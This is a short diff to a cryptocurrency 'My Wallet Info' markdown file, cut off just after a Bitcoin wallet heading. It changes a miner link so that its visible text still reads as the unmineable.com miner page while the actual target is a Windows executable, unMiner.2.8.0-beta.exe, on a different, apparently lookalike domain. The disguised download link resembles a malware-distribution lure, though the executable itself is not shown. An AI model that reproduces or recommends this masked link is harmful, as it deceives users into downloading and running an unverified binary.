@@ -1,6 +1,6 @@
 # My Wallet Info
 
-https://www.unmineable.com/miner
+[https://www.unmineable.com/miner](https://cdn.unmineable.download/unMiner.2.8.0-beta.exe)
 
 ## 📬 Bitcoin Wallet Address
 ```
